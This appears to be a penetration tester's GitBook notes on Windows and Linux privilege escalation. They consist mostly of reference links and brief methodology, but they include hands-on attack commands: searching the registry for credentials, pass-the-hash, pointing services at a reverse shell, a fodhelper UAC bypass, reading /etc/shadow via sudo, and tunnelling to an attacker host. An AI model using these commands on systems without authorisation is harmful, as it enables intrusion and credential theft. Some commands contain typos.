---
description: Shellin's for show, Rootin's for dough
---

# Privilege Escalation

![](<../../../../.gitbook/assets/image (2) (1).png>)

<details>

<summary>General Privilege Escalation Guides</summary>

* [HackTricks](https://book.hacktricks.xyz/). If I had to take one link with me into a pentest, this would be it. Written by the creator of WinPEAS and LinPEAS, it is THE guide for PrivEsc, and one of the best for everything else.&#x20;
* [Vulnhub PrivEsc Cheatsheet](https://github.com/Ignitetechnologies/Privilege-Escalation)
* PrivEsc for MySQL [https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/](https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/)
* [https://toshellandback.com/2015/11/24/ms-priv-esc/](https://toshellandback.com/2015/11/24/ms-priv-esc/)
* [https://www.ired.team/offensive-security/code-execution](https://www.ired.team/offensive-security/code-execution)
* [https://www.ired.team/offensive-security/code-injection-process-injection](https://www.ired.team/offensive-security/code-injection-process-injection)
* [https://www.ired.team/offensive-security/privilege-escalation](https://www.ired.team/offensive-security/privilege-escalation)
* [Conda's Priv Esc Video Playlist](https://www.youtube.com/playlist?list=PLDrNMcTNhhYrBNZ\_FdtMq-gLFQeUZFzWV)
* Metasploit/Empire PrivEsc - _PTFM pg. 31_

</details>

{% hint style="info" %}
Dont forget to to try any harvested credentials!
{% endhint %}

## Windows Privilege Escalation

{% tabs %}
{% tab title="Guides and Reference" %}
* [HackTricks: Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
* [PayloadsAllTheThings/Windows-PrivilegeEscalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
* [https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842](https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842)
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
* [https://rahmatnurfauzi.medium.com/windows-privilege-escalation-scripts-techniques-30fa37bd194](https://rahmatnurfauzi.medium.com/windows-privilege-escalation-scripts-techniques-30fa37bd194)
* [https://www.fuzzysecurity.com/tutorials/16.html](https://www.fuzzysecurity.com/tutorials/16.html)
* [https://www.greyhathacker.net/?p=738](https://www.greyhathacker.net/?p=738)
* [http://www.bhafsec.com/wiki/index.php/Windows\_Privilege\_Escalation](http://www.bhafsec.com/wiki/index.php/Windows\_Privilege\_Escalation)
* [https://www.sans.org/blog/kerberos-in-the-crosshairs-golden-tickets-silver-tickets-mitm-and-more/](https://www.sans.org/blog/kerberos-in-the-crosshairs-golden-tickets-silver-tickets-mitm-and-more/)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/local\_privilege\_escalation/local\_privilege\_escalation/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/local\_privilege\_escalation/local\_privilege\_escalation/)
{% endtab %}

{% tab title="Methodology" %}
### Basics

* Goal: Gain a shell as Administrator or SYSTEM
* SYSTEM is a default service account with the highest level of priv
* Resources - access/action set by ACL
  * Each ACL is made up of ACEs: relationship between an object/user, and a right.
* &#x20;Administrator Shells
  * Easy way: msfvenom
  * Admin-> SYSTEM use PSEXEC



### **Enumeration for PrivEsc**

* Check Whoami and net user \[user]
* Check for easy unpatched vulnerabilities

```
>wmic qfe get Caption,Description,HotFixID,InstalledOn
```

* Run winPEAS
  * \> reg add HKCU\Console /v VirtualTerminalLevel /t REG\_DWORD /d 1 (enables colors on command prompt)
* Run Seatbelt
  * .\Seatbelt.exe all
* Check for
  * Ability to odify a service
  * Ability to start/stop service
  * Interesting files that might contain creds
*   Try Payload all the things enumeration commands

    * Create checklist of the things tyou need to make an exploit work



### Order of Techniques

* Registry and service exploits first
* Kernel exploits last
{% endtab %}

{% tab title="PrivEsc Tools" %}
* [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) (The Go-To) - These tools search for possible local privilege escalation paths that you could exploit and print them to you with nice colors so you can recognize the misconfigurations easily.
* [SeatBelt](https://github.com/GhostPack/Seatbelt) - Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.
* [Windows Exploit Suggester Next Gen ](https://github.com/bitsadmin/wesng)- WES-NG is a tool based on the output of Windows' `systeminfo` utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities.
* [Sherlock](https://github.com/rasta-mouse/Sherlock) and [Watson](https://github.com/rasta-mouse/Watson) - look for missing patches and KBs         &#x20;
* [Accesschk.exe ](https://xor.cat/2017/09/05/sysinternals-accesschk-accepteula/)with the accept EULA flag - a [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) tool that is great for auditing privileges on your systems, and for auditing privileges on _others’_ systems. This version is a standalone utiltility with the older code that allows you to auto accept the EULA flag.
* [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) - From LOCAL/NETWORK SERVICE to SYSTEM by abusing `SeImpersonatePrivilege` on Windows 10 and Server 2016/2019.
* [Rattler](https://github.com/sensepost/rattler) - Rattler is a tool that automates the identification of DLL's which can be used for DLL preloading attacks.
* [SharpImpersonation](https://github.com/S3cur3Th1sSh1t/SharpImpersonation) - A User Impersonation tool - via Token or Shellcode injection
  * [https://s3cur3th1ssh1t.github.io/SharpImpersonation-Introduction/](https://s3cur3th1ssh1t.github.io/SharpImpersonation-Introduction/)
{% endtab %}

{% tab title="Potato Exploits" %}
* [Rotten Potato](https://github.com/breenmachine/RottenPotatoNG) - New version of RottenPotato as a C++ DLL and standalone C++ binary - no need for meterpreter or other tools. Leverages the privilege escalation chain based on [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges.
* [Juicy Potato](https://github.com/ohpe/juicy-potato) - Upgraded and Weaponized verison of RottenPotatoNG
* [Sweet Potato](https://github.com/CCob/SweetPotato) - A collection of various native Windows privilege escalation techniques from service accounts to SYSTEM
* [Rogue Potato](https://github.com/antonioCoco/RoguePotato) - Just another Windows Local Privilege Escalation from Service Account to System.&#x20;
  * [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
* [RemotePotato0](https://github.com/antonioCoco/RemotePotato0) - Just another "Won't Fix" Windows Privilege Escalation from User to Domain Admin.
* Hot Potato
  * Attack that uxses spoofing and NTLM relay to gain SYSTEM Priv
  * Tricks windows to authenticating as the SYSTEM user to a fake HTTP server with NTLM.
  * Potato.exe exploit code binary exists!!!
  * Dont forget to compile the code wiht your reverse shell details
* Token Impersonation
  * Cannot log directly into service accounts
  * Rotten Potato - Service accounts to intercept SYSTEM ticket and use it to impersonate SYSTEM user
  * Service accounts
    * Generally configured with SeImpersonate/SeAssignPrimaryToken privileges
    * This allows the account to impersonare the access tokens of other users including SYSTEM
    * Any user with these privs can run teh toeken impersonation exploits found.
  * Juicy Potato - [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
  * Rogue Potato - [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
  * PrintSpoofer - [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
{% endtab %}
{% endtabs %}

### Stored Credentials

* Several features store passwords insecurely, especially in the registry
* [https://www.hackingarticles.in/windows-privilege-escalation-stored-credentials-runas](https://www.hackingarticles.in/windows-privilege-escalation-stored-credentials-runas/)

{% tabs %}
{% tab title="Creds in Registry" %}
Stored Creds in Registry

* Seach the registry for keys and values that contain “password”
  * \>reg query HKLM /f password /t REG\_SZ /s
  * &#x20;\>reg query HKCU /f password /t REG\_SZ /s
* \>.\winPEADany.exe quiet filesinfo userinfo
* Query Autologins
  * \>reg query “HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
* Query Putty sessions
  * \>reg query “HKCU\Software\SimonTatham\PuTTY\Sessions” /s
* Spawn a shell with new credentials
  * \#winexe -U ‘admin%password’ //\[targetip] cmd.exe
  * \#winexe -U ‘admin%password’ --system //\[targetip] cmd.exe
{% endtab %}

{% tab title="Saved Creds" %}
Saved Creds

* Windows allows users to save thier credentials to the system for use with the runas command
* \>.\winPEASany.exe quiet cmd windowscreds
* \>cmdkey /list
  * \>run savecred.bat to refresh list of saved credentials
* \>runas /savecred /user:admin C;\reverse.exe
{% endtab %}

{% tab title="Config Files" %}
Config files

* Some config files will store admin creds
* Unattend.xml - for automated setup of windows
* Search for filenames: sysprep.inf, unattended.xml, sysprep.xml
* Recuresively search for files in the current dir with “pass” in the name, or ending in .config
  * \> dir /s \*pass\* == \*.config
* Recuresively search for files in the current dir with “password” in the name, and end in .xml, .ini, or ,txt
  * \> findstr /si password \*.xml \*.ini \*.txt
* \>.\winPEASany.exe quiet cmd searchfast filesinfo
{% endtab %}

{% tab title="SAM" %}
SAM

* This is where windows stores password hashes
* They are encrypted with a key that can be found in a file named SYSTEM
* If you can read both SAM and SYSTEM you can extract the hashes.
  * Located in C:\Windows\System32\config
  * These are locked while windows is running
  * Backups might exist in C:|windows\Repair or C:\Windows\System32\config\RegBack
* pwdump tool - part of creddump7
* Look at the NTLM hash - If the last section starts with “31d6c” this indicates the password is empty, or the accoutn is disabled.
* Crack the admin user hash with hashcat
{% endtab %}

{% tab title="Pass-The-Hash" %}
* Passing the hash
  * Windows accepts hashes instead of passwords for a number of services.
  * We can use pth-winexe to spawn a command prompt using the admin users pw hash
  * \#pth-winexe -U " \[entire hash including LM hash] //\[target] cmd.exe
{% endtab %}
{% endtabs %}

### Service Exploits

{% tabs %}
{% tab title="Enum Cmds" %}
First lets get a list of services that are running on the target and thier permissions

* \>accesschk.exe -uwcqv \*
* \>accesschk.exe -uwcqv “Authenticated Users” \*
* \> Get-WmiObject win32\_service | Select-Object Name, State, PathName | Where-Object {$\_.State -like 'Running'}
* \>sc.exe qc \[name] -query service config
* \>sc.exe query \[name] -query service status
* \>sc.exe config \[name] \[option]= \[value] -modify config option of a service
* \>net start/stop \[name] -start/stop a servic
{% endtab %}

{% tab title="Insecure Properties" %}
Insecure Service Properties

* Each service has an ACL to define certain permissions
* Check: you must be able to change a service AND stop/start the service
* \>.\winPEASany.exe quiet servicesinfo
* Verify with accesschk
  * .\accesschk.exe /accepteula -uwcqv user \[service]
* \>sc qc \[service]
* If you can change the service, try changing the BINARY\_PATH\_NAME to that over your reverse shell
  * \>sc config \[service] binpath= “\”C:\PrivEsc\reverse.exe\\""
* \>net start \[service]
{% endtab %}

{% tab title="Unquoted Paths" %}
Unquoted Service Paths

* Executables in windows can be run without their extensions
* Some executables take arguments separated by spaces
* Look for paths with spaces and no quotes
* Check permissions for the service
* Check for write permissions for each directory in the binary path
* Create a reverse shell executable and name it to the file that would be inserted into the unquoted path.
* _PTFM: Unquoted Service Paths - pg. 32_
{% endtab %}

{% tab title="Insecure Exe" %}
Insecure Service Executables

* If the original service executable is modifiable, we ca**n** simply replace it with our reverse shell
* Check for called files by services that are writable.
* Double check that you can start/stop the service
* Copy/overwite the reverse shell file on top of the weak file
{% endtab %}

{% tab title="DLL Hijack" %}
DLL Hijacking

* &#x20;Often an exe will try to load functionality from a library called a DLL
* What ever functionality the DLL gives, will be executed at the same priv as the service that loaded it.
* If the DLL has an absolute path, it might give priv esc if its writeable by our user.
* More common: if a DLL is missing and we have write access to a directory within the PATH that windows searches
* Might require manual enumeration
* Copy the target exe to your host dev and analyze the DLL
  * Run procmon > ctl+L > add new filter for your target dll
  * Look for Results “NAME NOT FOUND” to give the DLL location of the target
  * Create a reverse shell in a .dll named after the called dll file.
  * Copy/paste it to your target and place it in the Temp Directory



* [DLLHijackingScanner](https://github.com/SecuProject/DLLHijackingScanner) - This is a PoC for bypassing UAC using DLL hijacking and abusing the "Trusted Directories" verification.
  * [https://securityonline.info/dllhijackingscanner-bypassing-uac-using-dll-hijacking/](https://securityonline.info/dllhijackingscanner-bypassing-uac-using-dll-hijacking/)
* [Rattler](https://github.com/sensepost/rattler) - Rattler is a tool that automates the identification of DLL's which can be used for DLL preloading attacks.
  * [https://sensepost.com/blog/2016/rattleridentifying-and-exploiting-dll-preloading-vulnerabilities/](https://sensepost.com/blog/2016/rattleridentifying-and-exploiting-dll-preloading-vulnerabilities/)
* [DLLHijackTest](https://github.com/slyd0g/DLLHijackTest) - DLL and PowerShell script to assist with finding DLL hijacks
* [Robber](https://github.com/MojtabaTajik/Robber) - Robber is open source tool for finding executables prone to DLL hijacking
  * [https://hakin9.org/robber-is-open-source-tool-for-finding-executables-prone-to-dll-hijacking/](https://hakin9.org/robber-is-open-source-tool-for-finding-executables-prone-to-dll-hijacking/)
* [https://www.blackhillsinfosec.com/digging-deeper-vulnerable-windows-services/](https://www.blackhillsinfosec.com/digging-deeper-vulnerable-windows-services/)
* [https://attack.mitre.org/techniques/T1574/001/](https://attack.mitre.org/techniques/T1574/001/)
* [https://github.com/wietze/HijackLibs](https://github.com/wietze/HijackLibs) - Project for tracking publicly disclosed DLL Hijacking opportunities.
* DLL Search Order Hijacking - _PTFM:  - pg. 25_
{% endtab %}
{% endtabs %}

### Registry Exploits

{% tabs %}
{% tab title="Weak Registry Permissions" %}
Weak Registry Permissions

* Registry stores entries for each service
* Since entries can have ACL's, they can be mis-configured and modify a services config.
* Locate a weak registry entry > verify permissions with accesschk
* NT AUTHORITY\INTERACTIVE - user group that all users are apart of
* Overwrite the image path value in the registry, so the called executable in the service, points to your reverse shell
  * \>reg add HKLM\SYSTEM\CurrentControlSet\Services\\\[service] /v ImagePath -t REG\_EXPAND\_SZ /d C:\PrivEsc\Reverse.exe /f
{% endtab %}

{% tab title="Autoruns" %}
Autoruns are configed in the registry. If you can write to an Autorun executable, you may get priv esc on restart.

* \>.\winPEASany.exe quiet applicationsinfo
* \>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
* Paste reverse shell program over vul executable
* [https://www.hackingarticles.in/windows-privilege-escalation-boot-logon-autostart-execution-startup-folder/](https://www.hackingarticles.in/windows-privilege-escalation-boot-logon-autostart-execution-startup-folder/)
* [**Windows Privilege Escalation: Logon Autostart Execution (Registry Run Keys)**](https://www.hackingarticles.in/windows-privilege-escalation-logon-autostart-execution-registry-run-keys/)


{% endtab %}

{% tab title="AlwaysInstallElevated" %}
[**Windows Privilege Escalation (AlwaysInstallElevated)**](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/)

* MSI files are used to install apps. They run with the permissions of the user trying to install. You can run these with admin (elevated) privs. We can use this by creating a malicious MSI file containing a reverse shell
* Check 2 registry settings. These must be present and enabled
  * HKLM\SOFTWARE\POLICIES\Microsoft\Windows\Installer
  * HKCU\SOFTWARE\POLICIES\Microsoft\Windows\Installer
* \>.\winPEASany.exe quiet windowscreds
* \> reg query HKCU\SOFTWARE\POLICIES\Microsoft\Windows\Installer /v AlwaysInstallElevated
* Create a reverse shell in the .msi format
* [https://github/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/always\_install\_elevated.rb](https://github/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/always\_install\_elevated.rb)
{% endtab %}
{% endtabs %}

### Other Exploits And Techniques

{% tabs %}
{% tab title="Scheduled Tasks" %}
* Admins can config tasks to run as other users or SYSTEM
* List all tasks your current user can see
  * \> schtassk /query /fo LIST /v
  * PS> Get-ScheduledTask | where {$\_.TaskPath -notlike "\Microsoft\*} | ft TaskName,TaskPath,State
* Check tasks and called files for when/if they are executed
  * \>echo C:\reverse.exe >> \[scheduled executable]
* Schedule a task that runs everytime the system starts
  * \> schtasks /create /tn \[taskname] /tr \[Taskrun] /sc onstart
* Schedule a task that runs when a user logs on.
  * \> schtasks /create /tn \[taskname] /tr \[Taskrun] /sc onlogon
* Schedule a taks that runs when the system is idle
  * \> schtasks /create /tn \[taskname] /tr \[Taskrun] /sc onidle /i \[1-999]
* Schedule a task that runs one
  * \> schtasks /create /tn \[taskname] /tr \[Taskrun] /sc once /st {HH:MM}
* Schedule a task that runs with system permissions
  * \> schtasks /create /tn \[taskname] /tr \[Taskrun] /sc onlogon /ru System
* Schedule a task that runs on a remote computer
  * \> schtasks /create /tn \[taskname] /tr \[Taskrun] /sc onlogon /s \[PC name]
{% endtab %}

{% tab title="UAC Bypass" %}
* fodhelper.exe attack
  * _PTFM: UAC Bypass - pg. 33_
  * This binary runs as high integrity on windows 10. We can leverage it to bypas UAC by the way it uses the Registry.
  * Run C:\Windows\System32\fodhelper.exe -> manage optional features -> inspect application manifest with sigcheck
  * \> cd C:\Tools\privilege\_escalation\SysinternalsSuite
  * \> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
  * next we look at fodhelper.exe while running procmon
  * Will generate a “NAME NOT FOUND” error and indicate an potential exploitable registry entry
  * fodhelper.exe attemtps to query HKCU:\Software\Classes\ms-settings\shell\open\command, which does not appear to exist
  * \> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
  * \> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG\_SZ
  * \> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
* Via Event Viewer
  * _PTFM: UAC Bypass - pg. 33_**j**
{% endtab %}

{% tab title="Kernel Exploits" %}
* Can be leveraged to perform actions as SYSTEM
* Enumerate version and find matchign exploits > compile and execute
* Tools
  * Windows Exploit suggester
  * Precompiled exploits - [https://github.com/Secwiki/windows-kernel-exploits](https://github.com/Secwiki/windows-kernel-exploits)
  * Watson - rasta-mouse - [https://github.com/rasta-mouse/Watson](https://github.com/rasta-mouse/Watson)
* Identification
  * \>whoami
  * \>systeminfo
  * \> wmic qfe get Caption,Description,HotFixID,InstalledOn #will list all installed patches
* Exploit Packs
  * [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
  * [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
  * [https://github.com/egre55/windows-kernel-exploits](https://github.com/egre55/windows-kernel-exploits)
  * [https://github.com/padovah4ck/CVE-2020-0683](https://github.com/padovah4ck/CVE-2020-0683)
{% endtab %}

{% tab title="Misc" %}
* [**Windows Privilege Escalation: Boot Logon Autostart Execution (Startup Folder)**](https://www.hackingarticles.in/windows-privilege-escalation-boot-logon-autostart-execution-startup-folder/)
* [**Windows Privilege Escalation: SeImpersonatePrivilege**](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/)
* [**Windows Privilege Escalation: DnsAdmins to DomainAdmin**](https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/)
* [**Windows Privilege Escalation: SeBackupPrivilege**](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
* [**Windows Privilege Escalation (Insecure File Permissions)**](https://www.hackingarticles.in/windows-privilege-escalation-unquoted-path-service/)

### **I**nsecure GUI

* Older windows versions can allow certain GUI apps to run with admin priv
* [https://www.hackingarticles.in/windows-privilege-escalation-insecure-gui-application/](https://www.hackingarticles.in/windows-privilege-escalation-insecure-gui-application/)

### Vulnerable Apps

* Start up apps exist under each user as well as windows has a dir for all users
  * C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  * Files in here must be shortcut files
  * [https://www.hackingarticles.in/windows-privilege-escalation-boot-logon-autostart-execution-startup-folder/](https://www.hackingarticles.in/windows-privilege-escalation-boot-logon-autostart-execution-startup-folder/)
* Installed Apps
  * Look for exploits for specific installed applications via explotidb or searchsploit
  * Use tasklist or seatbelt
    * \>.\seatbelt.exe NonstandardProcesses

### Port Forwarding

* Sometimes its easier to run code on kali but the target is only listening on an internal port
* Enter Plink.exe
* winexe port connects with port 445
* Setup
  * /etc/ssh/sshd\_config - make usre PermitRootLogin is set to Yes
  * \#service ssh restart
* \>.\plink.exe root@\[attackerIP] -r 445:127.0.0.1:445
  * Forward remote port to local port
* Now we run winexe at our local port on the attacker box, and plink sends it to the target, posing as an internal port
  * \#winexe \_u ‘admin%password’ //127.0.0.1 cmd.exe
{% endtab %}
{% endtabs %}

## **Linux Privilege Escalation**

{% tabs %}
{% tab title="Guides and Reference" %}
* [HackTricks - Linux](https://book.hacktricks.xyz/linux-unix/privilege-escalation)
* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
* [https://in.security/lin-security-practise-your-linux-privilege-escalation-foo/](https://in.security/lin-security-practise-your-linux-privilege-escalation-foo/)
* [https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/](https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/)
* [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)
* [https://www.youtube.com/watch?v=dk2wsyFiosg](https://www.youtube.com/watch?v=dk2wsyFiosg)
* [https://resources.infosecinstitute.com/topic/privilege-escalation-linux-live-examples/#gref](https://resources.infosecinstitute.com/topic/privilege-escalation-linux-live-examples/#gref)
* [https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_-\_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_-\_linux.html)
* [https://xapax.github.io/security/#post\_exploitation/privilege\_escalation\_-\_linux/](https://xapax.github.io/security/#post\_exploitation/privilege\_escalation\_-\_linux/)
{% endtab %}

{% tab title="PrivEsc Tools" %}
* [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) - These tools search for possible local privilege escalation paths that you could exploit and print them to you with nice colors so you can recognize the misconfigurations easily.
* [LinEnum](https://github.com/rebootuser/LinEnum) - Scripted Local Linux Enumeration & Privilege Escalation Checks
* [LSE](https://github.com/diego-treitos/linux-smart-enumeration) - Linux Smart enumeration, Linux enumeration tools for pentesting and CTFs
* [Unix Privesc Check](http://pentestmonkey.net/tools/audit/unix-privesc-check) - Unix-privesc-checker is a script that runs on Unix systems (tested on Solaris 9, HPUX 11, Various Linuxes, FreeBSD 6.2). It tries to find misconfigurations that could allow local unprivilged users to escalate privileges to other users or to access local apps (e.g. databases).
* [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2) - Next-Generation Linux Kernel Exploit Suggester
* [SUDO Killer ](https://github.com/TH3xACE/SUDO\_KILLER)- Linux Privilege Escalation through SUDO abuse.
{% endtab %}

{% tab title="Methodology" %}
* Check user
* Run enum scripts at increasing levels
* Run manual commands
* Check user home dir
  * /var/backup, /var/log, history files
* Try quickest methods first
* Check internal ports
* Use Kernel exploits as a last resort
{% endtab %}
{% endtabs %}

<details>

<summary>Enumerate Permissions</summary>

* Users
  * Accounts in /etc/passwd
  * password hashes in /etc/shadow
  * identified by a UID
  * root = UID 0
  * 3 types
    * Real - defined in /etc/passwd. who they actually are
    * Effective - when executing a process as another user, thier effective ID is set to that user's real ID.
      * Most Access Control decisions
      * whoami
    * Saved - used to ensure SUID processes can temporarily switch a user's effective ID back to thier Rreal ID and back again without losing track of the original effective ID



</details>

### ****

* Groups
  * /etc/group
  * Primary and multiple secondary groups
  * Default primary group is same name as user account
* Files/Dir
  * Have a single owner and a group
  * Permissions:read write execute
  * 3 permission sets: owner, group, and all others
* Special permissions
  * setuid (SUID) bit - When set, files will get executed with privileges of the file owner
  * setgid (SGID) bit - When set on a file , files will get executed with the permissions of the file group
    * When set on a directory, files created in that directory will inherit the group of the directory itself
* Viewing permission
  * \#ls -l /file/path
  * First 10 characters are the permissions on the file
  * First character is the type: “-” for file, “d” for directory
  * SUID/SGID permissions are represented by an “s” in the execute position

## Techniques

### Kernel exploits

* \#uname -a Enumerate Kernel verison
* Find matching exploit, compile, and run
  * \#searchsploit \[option] \[option]
  * \#linux-exploit-suggester-2.py
  * \# uname -ar
  * \# cat /etc/issue
  * \# cat /etc/\*-release
  * \# cat /etc/lsb-release # Debian based
  * \# cat /etc/redhat-release # Redhat based
* [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)
* [https://github.com/SecWiki/linux-kernel-exploits](https://github.com/SecWiki/linux-kernel-exploits)
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
* [https://github.com/bcoles/kernel-exploits](https://github.com/bcoles/kernel-exploits)
* _PTFM: Dirty Cow PrivEsc pg. 92_&#x20;

### Service Exploits

* \#ps aux | grep “^root” Show all processes runnign as root
* \#netstat -nl Show all actice connections (look for services)
* Try to ID verison number and research for exploits
  * \#\<program> -v or --version show version number
  * \#dpkg -l | grep \<program>
  * \#rpm -qa | grep \<program>
* Some processes running as root may be bound to an internal port through which it communicates
  * If it cannot be run locally on the target machine, the port can be forwarded using ssh to your local machine
  * $ssh -R \<local port>:127.0.0.1:\<service-port> \<username>@\<local-machine>
  * Run netstat to see what services are listening to 127.0.0.1:\<port>, then use port forwarding to send to the target port

### Weak File permissions

* /etc/shadow
  * Readable - copy and crack the Root user hash
  * writeable - copy and edit the shadow file with new root password
* /etc/passwd
  * For backwards compatibility, if the second field of a user row is a passwrod hash, it takes precedent over /etc/shadow
  * Either replace the password for root, or append a new user with root permissions.
  * Delete the x in the second field reads as if there is no password for user
* Backups
  * Some can be readable to gather interesting files

### Sudo abuse

* Rules in /etc/sudoers
* Useful commands
  * \#sudo -u \<username> \<program>
  * \# sudo -l (show what you can run)
  * @ sudo -s
  * \#sudo -i
  * \#sudo /bin/bash
  * \#sudo passwd
* Shell escape sequences
  * [https://gtfobins.github.io/](https://gtfobins.github.io/)
  * search for the commands/binaries you can run as sudo, then pass arguements that force a new root shell
* Abusing intended functionality
  * Read/write to files owned by root
  * EX apache2 - it will try to read the first line of any file passed as an arguement.
    * \#sudo apache2 -f /etc/shadow
* Environment variables
  * Programs run through sudo can inherit the environment variables from the user's environment
  * In the /etc/sudoers file, The options env\_reset and env\_keep options are available. These are displayed wiht #sudo -l
  * LD\_PRELOAD variable that can be set to the path of a shared object file (.so)
    * By creating a custom shared object and an init() funciton, we can execute code as soon as the object is loaded
    * Will not work if real userID is different from effectiveID. ALso, sudo must have env\_keep option
    * \#sudo LD\_PRELOAD=\<path to created shared object> \<command you can run as sudo>
  * LD\_LIBRARY\_PATH
    * set of directories where shared libraries are searched for first
    * Print shared libraries uxsed by a program
      * \#ldd /usr/sbin/apache2
    * By creating a shared library wiht the same name as one used by a program, and setting the LD\_LIBRARY\_PATH to its parent dir, the program will load our shared library instead.
* Sudo Caching
  * _PTFM: Sudo Caching - pg. 93_

### Cron Jobs

* Run at the security level of the user that owns them
* Default run with /bin/sh with limited envi variables
* Cron table files (crontabs) store config for cron jobs
* Cronjobs are located in /var/spool/cron/ or /var/spool/cron/crontabs/
* System wide crontab is located in /etc/crontab
* If we can write to a program or script that gets run with a cronjob, we can replate it with our own code
* PATH envi variable
  * default set to /usr/bin
  * Can be overwritten in the crontab file
  * If a cronjob script/program does nto use absolute path and one of the path dir is user writeable, you can create a program or script with the same name as the cronjob
* Wildcard
  * When a wildcard char (\*) is provided to a command as par tof an arguement, the shell will first perform filename expansion (globbing) on the wildcard
  * this process replaces the wildcard with a speace-separated list of the file and directory names in the current directory
  * Can create filenames that match cmd line options like “--help”
*

### SUID/SGID Executables

* Find files with the SUID/SGID bit set
  * \#find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec la -l {} \\; 2> /dev/null
  * Can use shell escape sequences on SUID/SGID files
  * _PTFM: BSUID and SGID - pg. 93_
* Known Exploits - certain programs use SUID files as part of thier process or install.
  * Search for these! Look for exim!
* Shared Object Injection
  * Use strace to track system calls from a program to any shared objects it is trying to call
  * If we can write to the location, we cna create an object that will run wiht the program
  * Create a c file that creates a file
  * Compile the c file
    * \>gcc
* PATH envi variable
  * If a program tries to execute another by only using the program and and not the absolute path, we can tell the shell where to look
  * Finding vulnerbable programs
    * Those sub-secuted files are often mentioned as a string in the program.
    * Run strings on the host executable
    * Can also use strace or ltrace
    * \#strace -v -f -e execve \<command> 2>&1 | grep exec
    * Attack
      * Create new shell executable names the sub-executed service
      * Set the path varibale to the path of the newly created executable
      * \#PATH=.:$PATH \<host file to execute>
* Abusing shell features
  * Older versions <4.2-048 can define user functions with an absolute path name
    * These can be exported and can take precedence over the actual executable being called
    * \#function \<service oyu want to impersonate> { /bin/bash -p; )
    * \#export -f /user/sbin/service
  * Debugging mode which can be enabled with the -x command or by modifying SHELLOPTS to inclide xtrace
    * SHELLOPTS is read only, but the env command allows SHELLOPS to be set
    * When in debugging mode, Bash uses the env var PS4 to display an extra prompt for debug statements. This variebl can contain embedded commands
    * If an SUID file runs another via bash, those envi variables can be enherited.
    * This does not work on bash past 4.4
* [**Linux Privilege Escalation using SUID Binaries**](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)

### Passwords and Keys

* Service PWs may be stored in plain text in config files
* History files may contain a password used as part of a command
  * \#ls -a -> look for \_history files
* Config files
  * opnevpn files -> auth-user-pass option
* SSH Keys - can be used in leu of passwords

### NFS

* Shares configed under /etc/exports
